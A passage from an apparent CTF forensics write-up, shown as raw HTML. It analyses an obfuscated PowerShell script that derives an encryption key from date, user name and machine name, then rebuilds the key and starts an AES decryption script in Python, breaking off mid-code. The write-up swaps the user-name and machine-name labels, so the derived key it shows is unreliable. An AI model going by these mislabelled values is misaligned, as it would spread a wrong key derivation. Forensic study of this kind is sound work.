style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::MachineName).ToLower() ; $zVSza \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Environment\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UserName).ToLower() ; $I26 \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"yaginote.txt\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEq \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Date\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Format \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"HH:mm - dd/MM/yy\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; $Uz19o \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $7VEq.replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\":\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" \"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"-\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"/\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$zVSza\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OgE\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"$OgE = ([Environment]::MachineName).ToLower() ; $zVSza = ([Environment]::UserName).ToLower() ; $I26 = &#x22;yaginote.txt&#x22;\n$7VEq = Get-Date -Format &#x22;HH:mm - dd/MM/yy&#x22; ; $Uz19o = $7VEq.replace(&#x22;:&#x22;,&#x22;&#x22;).replace(&#x22; &#x22;,&#x22;&#x22;).replace(&#x22;-&#x22;,&#x22;&#x22;).replace(&#x22;/&#x22;,&#x22;&#x22;)+$zVSza+$OgE\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>\u003Ccode>$derivedKeyFromDateTime\u003C/code> was created from \u003Ccode>$formattedDateTime\u003C/code>, \u003Ccode>$username\u003C/code> and \u003Ccode>$machineName\u003C/code>.\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>$formattedDateTime\u003C/code>: Date and time when the script was executed (found earlier \u003Ccode> 00:09 - 19/09/24\u003C/code> )\u003C/li>\n\u003Cli>\u003Ccode>$username\u003C/code>: Machine name (found earlier \u003Ccode>win-ho5dpb1fvnd\u003C/code>)\u003C/li>\n\u003Cli>\u003Ccode>$machineName\u003C/code>: User name (found earlier \u003Ccode>administrator\u003C/code>)\u003C/li>\n\u003C/ul>\n\u003Cp>We got everything now let’s find \u003Ccode>$derivedKeyFromDateTime\u003C/code>\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">date_time \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"00:09 - 19/09/24\"\u003C/span>\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\"> # $7VEq\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">username \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"win-ho5dpb1fvnd\"\u003C/span>\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\">  # $zVSza\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">machine_name \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"administrator\"\u003C/span>\u003Cspan style=\"--shiki-light:#66707B;--shiki-dark:#BDC4CC\">  # $OgE\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">formatted_date \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> date_time.replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\":\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"-\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"/\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">derivedKeyFromDateTime \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> formatted_date \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> username \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> machine_name\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">print\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(derivedKeyFromDateTime)\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"date_time = &#x22;00:09 - 19/09/24&#x22; # $7VEq\nusername = &#x22;win-ho5dpb1fvnd&#x22;  # $zVSza\nmachine_name = &#x22;administrator&#x22;  # $OgE\n\nformatted_date = date_time.replace(&#x22;:&#x22;, &#x22;&#x22;).replace(&#x22; &#x22;, &#x22;&#x22;).replace(&#x22;-&#x22;, &#x22;&#x22;).replace(&#x22;/&#x22;, &#x22;&#x22;)\nderivedKeyFromDateTime = formatted_date + username + machine_name\n\nprint(derivedKeyFromDateTime)\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">python \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">u \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"e:\\CTF\\UrgentTina SVATTT\\Uz.py\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">0009190924win\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ho5dpb1fvndadministrator\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"python -u &#x22;e:\\CTF\\UrgentTina SVATTT\\Uz.py&#x22;\n0009190924win-ho5dpb1fvndadministrator\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"masterencryptionkey-wietm\">\u003Ch4 id=\"masterencryptionkey-wietm\">\u003Cspan class=\"katex\">\u003Cspan class=\"katex-mathml\">\u003Cmath xmlns=\"http://www.w3.org/1998/Math/MathML\">\u003Csemantics>\u003Cmrow>\u003Cmi>m\u003C/mi>\u003Cmi>a\u003C/mi>\u003Cmi>s\u003C/mi>\u003Cmi>t\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>r\u003C/mi>\u003Cmi>E\u003C/mi>\u003Cmi>n\u003C/mi>\u003Cmi>c\u003C/mi>\u003Cmi>r\u003C/mi>\u003Cmi>y\u003C/mi>\u003Cmi>p\u003C/mi>\u003Cmi>t\u003C/mi>\u003Cmi>i\u003C/mi>\u003Cmi>o\u003C/mi>\u003Cmi>n\u003C/mi>\u003Cmi>K\u003C/mi>\u003Cmi>e\u003C/mi>\u003Cmi>y\u003C/mi>\u003Cmo stretchy=\"false\">(\u003C/mo>\u003C/mrow>\u003Cannotation encoding=\"application/x-tex\">masterEncryptionKey (\u003C/annotation>\u003C/semantics>\u003C/math>\u003C/span>\u003Cspan class=\"katex-html\" aria-hidden=\"true\">\u003Cspan class=\"base\">\u003Cspan class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\">\u003C/span>\u003Cspan class=\"mord mathnormal\">ma\u003C/span>\u003Cspan class=\"mord mathnormal\">s\u003C/span>\u003Cspan class=\"mord mathnormal\">t\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">er\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E\u003C/span>\u003Cspan class=\"mord mathnormal\">n\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">cry\u003C/span>\u003Cspan class=\"mord mathnormal\">pt\u003C/span>\u003Cspan class=\"mord mathnormal\">i\u003C/span>\u003Cspan class=\"mord mathnormal\">o\u003C/span>\u003Cspan class=\"mord mathnormal\">n\u003C/span>\u003Cspan class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">Key\u003C/span>\u003Cspan class=\"mopen\">(\u003C/span>\u003C/span>\u003C/span>\u003C/span>WiETm)\u003C/h4>\n\u003Cp>We got all the data to find \u003Ccode>$masterEncryptionKey\u003C/code> now.\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"python\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">from\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> Crypto.Hash \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> SHA256\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">from\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> Crypto.Cipher \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> AES\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">import\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">def\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> decrypt_aes\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(ciphertext, key):\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    hashed_key \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> SHA256\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.new(key.encode(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'utf-8'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)).digest()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    enc_bytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64.b64decode(ciphertext)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    iv \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> enc_bytes[:\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">16\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    cipher_strings \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> enc_bytes[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">16\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    cipher \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> AES\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.new(hashed_key, \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">AES\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">MODE_CBC\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, iv)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    decrypted \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> cipher.decrypt(cipher_strings)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    decrypted \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decrypted.rstrip(\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">b\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">\\0\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decrypted.decode(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'utf-8'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">encryptedAesKey \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"fQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO/WXExiQoRBbJH6jB3C4aET51USIZ\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">derivedKeyFromDateTime \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 